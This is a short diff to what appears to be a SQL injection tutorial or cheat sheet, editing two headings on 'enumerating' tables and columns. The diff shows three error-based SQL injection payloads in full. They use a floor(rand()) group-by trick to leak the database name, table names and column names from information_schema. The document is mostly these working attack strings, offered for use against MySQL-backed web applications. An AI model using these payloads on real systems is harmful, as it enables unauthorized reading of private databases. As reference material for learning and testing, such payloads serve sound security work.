@@ -107,11 +107,11 @@ A subquery is usually added within the WHERE Clause of another SQL SELECT statem
 
 `(select 1 from(select count(*), concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a)b);`
 
-## Emurating Tables
+## Emurating Tables (`insert query in database area`)
 
 `(select 1 from(select count(*), concat("::",(select table_name from information_schema.tables where table_schema=database() limit 0,1),"::",floor(rand()*2))a from information_schema.columns group by a)b);`
 
-## Emurating Columns
+## Emurating Columns (`insert query in database area`)
 
 `(select 1 from(select count(*), concat("::",(select column_name from information_schema.columns where table_schema=database() limit 0,1),"::",floor(rand()*2))a from information_schema.columns group by a)b);`
 
